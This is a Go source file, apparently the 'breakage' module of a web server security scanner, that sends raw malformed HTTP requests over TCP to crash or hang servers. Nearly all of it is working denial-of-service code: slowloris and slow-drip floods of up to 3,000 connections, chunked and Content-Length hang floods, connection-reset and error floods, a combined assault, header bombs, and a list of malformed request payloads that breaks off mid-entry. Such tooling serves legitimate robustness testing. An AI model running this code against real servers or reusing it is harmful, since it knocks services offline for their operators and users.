// Package attacks provides the breakage module: raw TCP malformed HTTP requests
// designed to crash, hang, or disrupt web servers through protocol violations.
// These bypass Go's net/http client to send arbitrary bytes over TCP.
package attacks

import (
	"context"
	"fmt"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/glitchWebServer/internal/scanner"
)

// BreakageModule sends raw TCP malformed HTTP requests to discover parser
// crashes, hangs, and protocol violations. Unlike other modules that generate
// http.Request objects, this module connects directly via net.Dial.
type BreakageModule struct{}

func (m *BreakageModule) Name() string     { return "breakage" }
func (m *BreakageModule) Category() string { return "breakage" }
func (m *BreakageModule) Requests() int    { return 0 } // raw TCP, not HTTP requests

// GenerateRequests returns empty — this module uses RunRawTCP() for raw TCP attacks.
func (m *BreakageModule) GenerateRequests(target string) []scanner.AttackRequest {
	return nil
}

// breakageAttack defines a raw TCP attack payload with metadata.
type breakageAttack struct {
	name        string
	category    string // sub-category: "request-line", "headers", "chunked", "smuggling", "cve", etc.
	description string
	severity    string // critical, high, medium, low, info
	payload     func(host string) []byte
	// timeout for reading response (short = expects quick reject, long = expects hang)
	readTimeout time.Duration
}

// RunRawTCP executes all raw TCP breakage attacks against the target.
func (m *BreakageModule) RunRawTCP(ctx context.Context, target string, concurrency int, timeout time.Duration) []scanner.Finding {
	if concurrency <= 0 {
		concurrency = 10
	}
	if timeout <= 0 {
		timeout = 30 * time.Second
	}

	parsed, err := url.Parse(target)
	if err != nil {
		return nil
	}
	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}
	hostname := parsed.Hostname()

	attacks := allBreakageAttacks(hostname)

	var (
		findings    []scanner.Finding
		mu          sync.Mutex
		wg          sync.WaitGroup
		sem         = make(chan struct{}, concurrency)
	)

	for _, atk := range attacks {
		if ctx.Err() != nil {
			break
		}

		atk := atk
		sem <- struct{}{}
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			finding := executeBreakageAttack(ctx, host, atk, timeout)
			if finding != nil {
				mu.Lock()
				findings = append(findings, *finding)
				mu.Unlock()
			}

			// Check if server is still alive after attack
			if !probeAlive(host, 3*time.Second) {
				mu.Lock()
				findings = append(findings, scanner.Finding{
					Category:    "breakage-crash",
					Severity:    "critical",
					URL:         "tcp://" + host,
					Method:      "RAW",
					Description: fmt.Sprintf("Server became unresponsive after attack: %s", atk.name),
					Evidence:    fmt.Sprintf("Attack '%s' (%s) caused server to stop accepting connections", atk.name, atk.category),
				})
				mu.Unlock()
			}
		}()
	}

	wg.Wait()

	// Phase 2: Sequence attacks — multi-step patterns that stress server state
	if ctx.Err() == nil {
		seqFindings := m.runSequenceAttacks(ctx, host, hostname)
		findings = append(findings, seqFindings...)
	}

	return findings
}

// runSequenceAttacks tries multi-request patterns that stress server state management.
func (m *BreakageModule) runSequenceAttacks(ctx context.Context, addr, hostname string) []scanner.Finding {
	var findings []scanner.Finding

	// Attack 1: Partial header flood (slowloris-style)
	if ctx.Err() == nil {
		if f := m.attackPartialHeaderFlood(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 2: Pipeline confusion — mixed valid/malformed on one connection
	if ctx.Err() == nil {
		if f := m.attackPipelineConfusion(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 3: Connection reuse after error
	if ctx.Err() == nil {
		if f := m.attackPostErrorReuse(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 4: Rapid open/close (TCP RST flood)
	if ctx.Err() == nil {
		if f := m.attackRapidReset(ctx, addr); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 5: Slow header drip (run early before other attacks consume resources)
	if ctx.Err() == nil {
		if f := m.attackSlowHeaderDrip(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 6: Massive connection hold (500 partial connections)
	if ctx.Err() == nil {
		if f := m.attackMassiveConnectionHold(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 7: Chunked hang flood (100 incomplete chunked requests)
	if ctx.Err() == nil {
		if f := m.attackChunkedHangFlood(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 8: CL mismatch hang (large Content-Length, no body, at scale)
	if ctx.Err() == nil {
		if f := m.attackCLMismatchHang(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 9: 500-triggering flood (rapid fire of payloads that cause 500s)
	if ctx.Err() == nil {
		findings = append(findings, m.attack500Flood(ctx, addr, hostname)...)
	}

	// Attack 10: Combined simultaneous attack
	if ctx.Err() == nil {
		if f := m.attackCombinedAssault(ctx, addr, hostname); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 11: Header bomb escalation
	if ctx.Err() == nil {
		findings = append(findings, m.attackHeaderBombEscalation(ctx, addr, hostname)...)
	}

	return findings
}

// attackPartialHeaderFlood sends many partial requests on separate connections.
// Starts with 100 and escalates to find the server's breaking point.
func (m *BreakageModule) attackPartialHeaderFlood(ctx context.Context, addr, hostname string) *scanner.Finding {
	for _, count := range []int{100, 250, 500} {
		if ctx.Err() != nil {
			break
		}

		conns := make([]net.Conn, 0, count)
		for i := 0; i < count; i++ {
			if ctx.Err() != nil {
				break
			}
			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
			if err != nil {
				break
			}
			conn.SetDeadline(time.Now().Add(30 * time.Second))
			fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nX-Slow: %d\r\n", hostname, i)
			conns = append(conns, conn)
		}

		time.Sleep(1 * time.Second)
		alive := probeAlive(addr, 5*time.Second)

		// Clean up before next attempt
		for _, c := range conns {
			c.Close()
		}

		if !alive {
			// Wait for recovery before returning
			time.Sleep(2 * time.Second)
			return &scanner.Finding{
				Category:    "breakage-exhaustion",
				Severity:    "critical",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: fmt.Sprintf("Server unresponsive after %d partial-header connections (Slowloris/connection pool exhaustion)", len(conns)),
				Evidence:    fmt.Sprintf("Opened %d connections with incomplete headers, server became completely unavailable", len(conns)),
			}
		}
		time.Sleep(1 * time.Second)
	}
	return nil
}

// attackPipelineConfusion sends mixed valid/malformed pipelined requests.
func (m *BreakageModule) attackPipelineConfusion(ctx context.Context, addr, hostname string) *scanner.Finding {
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	for i := 0; i < 20; i++ {
		if i%3 == 0 {
			fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nContent-Length: -1\r\n\r\n", hostname)
		} else {
			fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", hostname)
		}
	}

	buf := make([]byte, 8192)
	n, readErr := conn.Read(buf)
	if n > 0 {
		resp := string(buf[:n])
		count500 := strings.Count(resp, " 500 ")
		if count500 >= 3 {
			return &scanner.Finding{
				Category:    "breakage-connection",
				Severity:    "medium",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: fmt.Sprintf("Pipeline confusion: %d/20 pipelined requests caused 500s", count500),
				Evidence:    fmt.Sprintf("Mixed valid/malformed pipelined requests produced %d HTTP 500 responses", count500),
			}
		}
	}
	if readErr != nil && strings.Contains(readErr.Error(), "connection reset") {
		return &scanner.Finding{
			Category:    "breakage-connection",
			Severity:    "medium",
			URL:         "tcp://" + addr,
			Method:      "RAW",
			Description: "Server reset connection on pipelined mixed valid/malformed requests",
			Evidence:    fmt.Sprintf("Pipeline of 20 mixed requests caused connection reset: %v", readErr),
		}
	}
	return nil
}

// attackPostErrorReuse sends malformed then valid request on same connection.
func (m *BreakageModule) attackPostErrorReuse(ctx context.Context, addr, hostname string) *scanner.Finding {
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	conn.Write([]byte("INVALID\x00GARBAGE\r\n\r\n"))
	buf := make([]byte, 4096)
	conn.Read(buf)

	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", hostname)
	n, _ := conn.Read(buf)
	if n > 0 {
		resp := string(buf[:n])
		if strings.Contains(resp, " 500 ") {
			return &scanner.Finding{
				Category:    "breakage-connection",
				Severity:    "high",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: "Server returned 500 for valid request after malformed request on same connection",
				Evidence:    "Connection reuse after error caused 500 for subsequent valid request",
			}
		}
	}
	return nil
}

// attackRapidReset opens and immediately closes many connections.
func (m *BreakageModule) attackRapidReset(ctx context.Context, addr string) *scanner.Finding {
	for i := 0; i < 200; i++ {
		if ctx.Err() != nil {
			break
		}
		conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
		if err != nil {
			continue
		}
		conn.Close()
	}

	time.Sleep(500 * time.Millisecond)
	if !probeAlive(addr, 3*time.Second) {
		return &scanner.Finding{
			Category:    "breakage-connection",
			Severity:    "high",
			URL:         "tcp://" + addr,
			Method:      "RAW",
			Description: "Server unresponsive after 200 rapid connect/disconnect cycles (TCP RST flood)",
			Evidence:    "200 connections opened and immediately closed caused server to stop responding",
		}
	}
	return nil
}

// attackMassiveConnectionHold opens connections with partial requests at increasing scale.
func (m *BreakageModule) attackMassiveConnectionHold(ctx context.Context, addr, hostname string) *scanner.Finding {
	for _, count := range []int{500, 1000, 2000} {
		if ctx.Err() != nil {
			break
		}

		conns := make([]net.Conn, 0, count)
		for i := 0; i < count; i++ {
			if ctx.Err() != nil {
				break
			}
			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
			if err != nil {
				break
			}
			conn.SetDeadline(time.Now().Add(60 * time.Second))
			fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nX-Hold: %d\r\n", hostname, i)
			conns = append(conns, conn)
		}

		time.Sleep(2 * time.Second)
		alive := probeAlive(addr, 5*time.Second)

		for _, c := range conns {
			c.Close()
		}

		if !alive {
			time.Sleep(2 * time.Second)
			return &scanner.Finding{
				Category:    "breakage-exhaustion",
				Severity:    "critical",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: fmt.Sprintf("Server unresponsive with %d partial connections (massive connection hold)", len(conns)),
				Evidence:    fmt.Sprintf("%d connections with incomplete headers caused complete server unavailability", len(conns)),
			}
		}
		time.Sleep(1 * time.Second)
	}
	return nil
}

// attackChunkedHangFlood opens many connections with incomplete chunked transfers.
func (m *BreakageModule) attackChunkedHangFlood(ctx context.Context, addr, hostname string) *scanner.Finding {
	conns := make([]net.Conn, 0, 200)
	defer func() {
		for _, c := range conns {
			c.Close()
		}
	}()

	for i := 0; i < 200; i++ {
		if ctx.Err() != nil {
			break
		}
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil {
			break
		}
		conn.SetDeadline(time.Now().Add(60 * time.Second))
		// Start chunked request, send one chunk, never finish
		fmt.Fprintf(conn, "POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n1\r\na\r\n", hostname)
		conns = append(conns, conn)
	}

	time.Sleep(1 * time.Second)
	if !probeAlive(addr, 5*time.Second) {
		return &scanner.Finding{
			Category:    "breakage-exhaustion",
			Severity:    "critical",
			URL:         "tcp://" + addr,
			Method:      "RAW",
			Description: fmt.Sprintf("Server unresponsive with %d incomplete chunked transfers (resource exhaustion)", len(conns)),
			Evidence:    fmt.Sprintf("%d connections stuck waiting for chunked data caused complete server unavailability", len(conns)),
		}
	}
	return nil
}

// attackCLMismatchHang opens connections claiming large Content-Length with no body.
func (m *BreakageModule) attackCLMismatchHang(ctx context.Context, addr, hostname string) *scanner.Finding {
	conns := make([]net.Conn, 0, 100)
	defer func() {
		for _, c := range conns {
			c.Close()
		}
	}()

	for i := 0; i < 100; i++ {
		if ctx.Err() != nil {
			break
		}
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil {
			break
		}
		conn.SetDeadline(time.Now().Add(60 * time.Second))
		// Claim 10MB body, send nothing
		fmt.Fprintf(conn, "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 10485760\r\n\r\n", hostname)
		conns = append(conns, conn)
	}

	time.Sleep(2 * time.Second)
	if !probeAlive(addr, 5*time.Second) {
		return &scanner.Finding{
			Category:    "breakage-exhaustion",
			Severity:    "critical",
			URL:         "tcp://" + addr,
			Method:      "RAW",
			Description: fmt.Sprintf("Server unresponsive with %d CL-mismatch connections (body wait exhaustion)", len(conns)),
			Evidence:    fmt.Sprintf("%d connections claiming 10MB Content-Length with no body caused complete unavailability", len(conns)),
		}
	}
	return nil
}

// attack500Flood rapidly fires payloads known to cause 500s to overwhelm error handling.
func (m *BreakageModule) attack500Flood(ctx context.Context, addr, hostname string) []scanner.Finding {
	// Payloads that commonly cause 500s
	crashPayloads := [][]byte{
		[]byte("GET / HTTP/1.1\rHost: " + hostname + "\r\r"),
		[]byte("POST / HTTP/1.1\r\nHost: " + hostname + "\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFFFFFFFFFFFF\r\ndata\r\n0\r\n\r\n"),
		[]byte("\r\n\r\n"),
		[]byte("INVALID\x00GARBAGE\r\n\r\n"),
	}

	var wg sync.WaitGroup
	errors500 := int64(0)
	total := 500

	for i := 0; i < total; i++ {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			payload := crashPayloads[idx%len(crashPayloads)]
			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()
			conn.SetDeadline(time.Now().Add(5 * time.Second))
			conn.Write(payload)
			buf := make([]byte, 1024)
			n, _ := conn.Read(buf)
			if n > 0 && strings.Contains(string(buf[:n]), " 500 ") {
				atomic.AddInt64(&errors500, 1)
			}
		}(i)
	}
	wg.Wait()

	var findings []scanner.Finding

	if errors500 > 0 {
		// Check if server survived
		time.Sleep(1 * time.Second)
		alive := probeAlive(addr, 5*time.Second)
		if !alive {
			findings = append(findings, scanner.Finding{
				Category:    "breakage-crash",
				Severity:    "critical",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: fmt.Sprintf("Server crashed or hung after %d/%d requests caused 500 errors", errors500, total),
				Evidence:    fmt.Sprintf("Flood of %d concurrent malformed requests produced %d HTTP 500s and caused server failure", total, errors500),
			})
		} else if errors500 > int64(total/2) {
			findings = append(findings, scanner.Finding{
				Category:    "breakage-stability",
				Severity:    "high",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: fmt.Sprintf("Server produced %d/%d HTTP 500 errors from malformed request flood", errors500, total),
				Evidence:    fmt.Sprintf("%d concurrent malformed requests caused %d internal server errors (%.0f%% error rate)", total, errors500, float64(errors500)/float64(total)*100),
			})
		}
	}
	return findings
}

// attackCombinedAssault runs multiple attack types simultaneously.
func (m *BreakageModule) attackCombinedAssault(ctx context.Context, addr, hostname string) *scanner.Finding {
	var wg sync.WaitGroup

	// Goroutine 1: Hold 100 partial connections
	holdConns := make([]net.Conn, 0, 100)
	var holdMu sync.Mutex
	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < 100; i++ {
			if ctx.Err() != nil {
				break
			}
			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
			if err != nil {
				break
			}
			conn.SetDeadline(time.Now().Add(30 * time.Second))
			fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nX-Hold: %d\r\n", hostname, i)
			holdMu.Lock()
			holdConns = append(holdConns, conn)
			holdMu.Unlock()
		}
	}()

	// Goroutine 2: Send 200 malformed requests rapidly
	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < 200; i++ {
			if ctx.Err() != nil {
				break
			}
			conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
			if err != nil {
				continue
			}
			conn.SetDeadline(time.Now().Add(3 * time.Second))
			conn.Write([]byte("GET / HTTP/1.1\rHost: " + hostname + "\r\r"))
			buf := make([]byte, 512)
			conn.Read(buf)
			conn.Close()
		}
	}()

	// Goroutine 3: Send 100 chunked hangs
	chunkConns := make([]net.Conn, 0, 100)
	var chunkMu sync.Mutex
	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < 100; i++ {
			if ctx.Err() != nil {
				break
			}
			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
			if err != nil {
				break
			}
			conn.SetDeadline(time.Now().Add(30 * time.Second))
			fmt.Fprintf(conn, "POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n1\r\na\r\n", hostname)
			chunkMu.Lock()
			chunkConns = append(chunkConns, conn)
			chunkMu.Unlock()
		}
	}()

	wg.Wait()

	// Clean up held connections after checking
	defer func() {
		for _, c := range holdConns {
			c.Close()
		}
		for _, c := range chunkConns {
			c.Close()
		}
	}()

	time.Sleep(1 * time.Second)
	if !probeAlive(addr, 5*time.Second) {
		return &scanner.Finding{
			Category:    "breakage-crash",
			Severity:    "critical",
			URL:         "tcp://" + addr,
			Method:      "RAW",
			Description: fmt.Sprintf("Server destroyed by combined assault (%d partial + 200 malformed + %d chunked hang)", len(holdConns), len(chunkConns)),
			Evidence:    fmt.Sprintf("Simultaneous attack: %d held connections, 200 malformed requests, %d incomplete chunked transfers caused complete server failure", len(holdConns), len(chunkConns)),
		}
	}
	return nil
}

// attackHeaderBombEscalation sends requests with exponentially increasing header counts.
func (m *BreakageModule) attackHeaderBombEscalation(ctx context.Context, addr, hostname string) []scanner.Finding {
	var findings []scanner.Finding

	for _, count := range []int{100, 500, 1000, 5000, 10000, 50000} {
		if ctx.Err() != nil {
			break
		}

		conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
		if err != nil {
			break
		}
		conn.SetDeadline(time.Now().Add(15 * time.Second))

		fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\n", hostname)
		for i := 0; i < count; i++ {
			fmt.Fprintf(conn, "X-H%d: value%d\r\n", i, i)
		}
		fmt.Fprintf(conn, "\r\n")

		buf := make([]byte, 4096)
		n, _ := conn.Read(buf)
		conn.Close()

		if n > 0 {
			line := strings.SplitN(string(buf[:n]), "\r\n", 2)[0]
			if strings.Contains(line, " 500 ") {
				findings = append(findings, scanner.Finding{
					Category:    "breakage-headers",
					Severity:    "high",
					URL:         "tcp://" + addr,
					Method:      "RAW",
					Description: fmt.Sprintf("Server returned HTTP 500 with %d headers", count),
					Evidence:    fmt.Sprintf("%d headers caused internal server error: %s", count, truncate(line, 100)),
				})
			}
		}

		if !probeAlive(addr, 3*time.Second) {
			findings = append(findings, scanner.Finding{
				Category:    "breakage-crash",
				Severity:    "critical",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: fmt.Sprintf("Server crashed after receiving %d headers", count),
				Evidence:    fmt.Sprintf("Request with %d headers caused server to stop responding", count),
			})
			break
		}
	}
	return findings
}

// attackSlowHeaderDrip holds connections alive by slowly dripping headers,
// preventing connection timeouts and exhausting the server's connection pool.
// Each goroutine connects and immediately starts dripping to prevent the
// server from timing out the connection. More effective than batch approaches
// against event-driven servers like Nginx.
func (m *BreakageModule) attackSlowHeaderDrip(ctx context.Context, addr, hostname string) *scanner.Finding {
	for _, count := range []int{1000, 2000, 3000} {
		if ctx.Err() != nil {
			break
		}

		var (
			conns []net.Conn
			mu    sync.Mutex
			wg    sync.WaitGroup
			stop  = make(chan struct{})
		)

		// Each goroutine connects AND drips — interleaved, not batched.
		// Stagger by 1ms per connection to gradually fill the pool.
		for i := 0; i < count; i++ {
			if ctx.Err() != nil {
				break
			}
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
				if err != nil {
					return
				}
				conn.SetDeadline(time.Now().Add(60 * time.Second))
				fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nX-H: %d\r\n", hostname, idx)
				mu.Lock()
				conns = append(conns, conn)
				mu.Unlock()

				// Drip headers to keep connection alive
				for j := 0; j < 30; j++ {
					select {
					case <-stop:
						return
					case <-time.After(1 * time.Second):
					}
					conn.SetDeadline(time.Now().Add(10 * time.Second))
					if _, err := fmt.Fprintf(conn, "X-D-%d: v%d\r\n", j, j); err != nil {
						return
					}
				}
			}(i)
			time.Sleep(1 * time.Millisecond) // 1ms stagger per connection
		}

		// Wait for connections to accumulate and overwhelm the server
		time.Sleep(15 * time.Second)

		alive := probeAlive(addr, 10*time.Second)

		// Stop dripping and clean up
		close(stop)
		mu.Lock()
		for _, c := range conns {
			c.Close()
		}
		established := len(conns)
		mu.Unlock()
		wg.Wait()

		if !alive {
			time.Sleep(3 * time.Second)
			return &scanner.Finding{
				Category:    "breakage-exhaustion",
				Severity:    "critical",
				URL:         "tcp://" + addr,
				Method:      "RAW",
				Description: fmt.Sprintf("Server unresponsive under %d slow-drip connections (keeps sending headers to prevent timeout)", established),
				Evidence:    fmt.Sprintf("%d connections slowly dripping headers caused complete server unavailability", established),
			}
		}

		time.Sleep(3 * time.Second)
	}
	return nil
}

func executeBreakageAttack(ctx context.Context, addr string, atk breakageAttack, baseTimeout time.Duration) *scanner.Finding {
	readTimeout := atk.readTimeout
	if readTimeout <= 0 {
		readTimeout = 3 * time.Second
	}

	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return nil // can't connect, not a finding
	}
	defer conn.Close()

	hostname := strings.Split(addr, ":")[0]
	payload := atk.payload(hostname)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, err = conn.Write(payload)
	if err != nil {
		return nil // write failed, connection rejected
	}

	conn.SetReadDeadline(time.Now().Add(readTimeout))
	buf := make([]byte, 4096)
	n, readErr := conn.Read(buf)

	resp := ""
	if n > 0 {
		resp = string(buf[:n])
	}

	// Analyze the response for interesting behavior
	return analyzeResponse(atk, resp, readErr)
}

func analyzeResponse(atk breakageAttack, resp string, readErr error) *scanner.Finding {
	statusLine := ""
	if resp != "" {
		statusLine = strings.SplitN(resp, "\r\n", 2)[0]
		if statusLine == resp {
			statusLine = strings.SplitN(resp, "\n", 2)[0]
		}
	}

	// HTTP 500 = server error triggered by our malformed input
	if strings.Contains(statusLine, " 500 ") {
		return &scanner.Finding{
			Category:    "breakage-" + atk.category,
			Severity:    "high",
			URL:         atk.name,
			Method:      "RAW",
			StatusCode:  500,
			Description: fmt.Sprintf("Server returned HTTP 500 from malformed request: %s", atk.description),
			Evidence:    fmt.Sprintf("Attack: %s | Response: %s", atk.name, truncate(statusLine, 200)),
		}
	}

	// Non-HTTP response (server sent raw HTML without status line)
	if resp != "" && !strings.HasPrefix(resp, "HTTP/") {
		return &scanner.Finding{
			Category:    "breakage-" + atk.category,
			Severity:    "medium",
			URL:         atk.name,
			Method:      "RAW",
			Description: fmt.Sprintf("Server returned non-HTTP response (protocol violation): %s", atk.description),
			Evidence:    fmt.Sprintf("Attack: %s | Response starts with: %s", atk.name, truncate(resp, 200)),
		}
	}

	// Connection reset = server actively killed the connection (could indicate panic)
	if readErr != nil && strings.Contains(readErr.Error(), "connection reset") {
		return &scanner.Finding{
			Category:    "breakage-" + atk.category,
			Severity:    "medium",
			URL:         atk.name,
			Method:      "RAW",
			Description: fmt.Sprintf("Server reset connection on malformed request: %s", atk.description),
			Evidence:    fmt.Sprintf("Attack: %s | Error: %v", atk.name, readErr),
		}
	}

	return nil
}

func truncate(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

func probeAlive(addr string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	hostname := strings.Split(addr, ":")[0]
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", hostname)
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	return n > 0
}

// allBreakageAttacks returns all raw TCP attack payloads.
func allBreakageAttacks(_ string) []breakageAttack {
	return []breakageAttack{
		// ===== REQUEST LINE MALFORMATION =====
		{
			name: "bare_cr_no_lf", category: "request-line",
			description: "Line endings with bare CR (\\r) without LF (\\n)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\rHost: " + host + "\r\r")
			},
			readTimeout: 3 * time.Second,
		},
		{
			name: "null_in_method", category: "request-line",
			description: "Null byte embedded in HTTP method",
			payload: func(host string) []byte {
				return []byte("G\x00ET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "null_in_uri", category: "request-line",
			description: "Null byte embedded in URI path",
			payload: func(host string) []byte {
				return []byte("GET /\x00path HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "null_in_version", category: "request-line",
			description: "Null byte in HTTP version string",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.\x001\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "http_09_request", category: "request-line",
			description: "HTTP/0.9 request (no headers, no version)",
			payload: func(_ string) []byte { return []byte("GET /\r\n") },
		},
		{
			name: "http_version_99", category: "request-line",
			description: "Invalid HTTP version 9.9",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/9.9\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "tab_separators", category: "request-line",
			description: "Tab characters instead of spaces in request line",
			payload: func(host string) []byte {
				return []byte("GET\t/\tHTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "no_space_after_method", category: "request-line",
			description: "Method concatenated with URI (no space)",
			payload: func(host string) []byte {
				return []byte("GET/ HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "utf8_bom_prefix", category: "request-line",
			description: "UTF-8 BOM before HTTP method",
			payload: func(host string) []byte {
				return []byte("\xef\xbb\xbfGET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "h2_preface_on_http1", category: "request-line",
			description: "HTTP/2 connection preface sent to HTTP/1.1 port",
			payload: func(_ string) []byte {
				return []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
			},
		},
		{
			name: "empty_request", category: "request-line",
			description: "Empty request (only CRLF)",
			payload: func(_ string) []byte { return []byte("\r\n\r\n") },
		},
		{
			name: "overlong_method", category: "request-line",
			description: "64KB method name to overflow parser buffers",
			payload: func(host string) []byte {
				return []byte(strings.Repeat("A", 65536) + " / HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "overlong_uri", category: "request-line",
			description: "128KB URI to overflow parser buffers",
			payload: func(host string) []byte {
				return []byte("GET /" + strings.Repeat("B", 131072) + " HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},

		// ===== HEADER MALFORMATION =====
		{
			name: "header_null_in_name", category: "headers",
			description: "Null byte in header name",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-\x00Test: value\r\n\r\n")
			},
		},
		{
			name: "header_null_in_value", category: "headers",
			description: "Null byte in header value (scanner killer pattern)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Test: val\x00ue\r\n\r\n")
			},
		},
		{
			name: "header_obs_fold", category: "headers",
			description: "Obsolete header line folding (space continuation)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Fold: line1\r\n line2\r\n\r\n")
			},
		},
		{
			name: "header_no_colon", category: "headers",
			description: "Header without colon separator",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nBadHeader value\r\n\r\n")
			},
		},
		{
			name: "header_space_before_colon", category: "headers",
			description: "Space before colon in header name",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Test : value\r\n\r\n")
			},
		},
		{
			name: "header_empty_name", category: "headers",
			description: "Empty header name (just colon)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\n: value\r\n\r\n")
			},
		},
		{
			name: "no_host_header", category: "headers",
			description: "HTTP/1.1 request without required Host header",
			payload: func(_ string) []byte {
				return []byte("GET / HTTP/1.1\r\n\r\n")
			},
		},
		{
			name: "duplicate_host", category: "headers",
			description: "Duplicate Host headers with different values",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nHost: evil.example.com\r\n\r\n")
			},
		},
		{
			name: "duplicate_content_length", category: "headers",
			description: "Duplicate Content-Length with different values",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 0\r\nContent-Length: 999999\r\n\r\n")
			},
		},
		{
			name: "10000_headers", category: "headers",
			description: "10,000 headers to overflow header table",
			payload: func(host string) []byte {
				hdrs := "GET / HTTP/1.1\r\nHost: " + host + "\r\n"
				for i := 0; i < 10000; i++ {
					hdrs += fmt.Sprintf("X-H%d: v%d\r\n", i, i)
				}
				hdrs += "\r\n"
				return []byte(hdrs)
			},
			readTimeout: 10 * time.Second,
		},
		{
			name: "header_64kb_value", category: "headers",
			description: "Single header with 64KB value",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Big: " + strings.Repeat("A", 65536) + "\r\n\r\n")
			},
		},
		{
			name: "lf_only_line_endings", category: "headers",
			description: "LF-only line endings (no CR) throughout request",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\nHost: " + host + "\n\n")
			},
		},
		{
			name: "crlf_rn_r_termination", category: "headers",
